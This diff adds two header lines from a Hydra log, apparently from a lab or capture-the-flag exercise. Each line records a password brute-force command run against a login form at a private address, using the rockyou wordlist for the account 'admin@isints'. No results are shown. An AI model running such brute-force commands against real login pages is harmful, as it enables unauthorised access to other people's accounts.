@@ -1,0 +1,2 @@
+# Hydra v9.0 run at 2021-05-14 05:05:30 on 10.10.10.100 http-post-form (hydra -l admin@isints -P /usr/share/wordlists/rockyou.txt -o hydra.log 10.10.10.100 http-post-form /login.php:email=^USER^&pass=^PASS^&submit=Login&submitted=TRUE:our browser must allow cookies in order to log in.)
+# Hydra v9.0 run at 2021-05-14 05:15:56 on 10.10.10.100 http-post-form (hydra -l admin@isints -P /usr/share/wordlists/rockyou.txt -o hydra.log 10.10.10.100 http-post-form /login.php:email=^USER^&pass=^PASS^&submit=Login&submitted=TRUE:our browser must allow cookies in order to log in.)
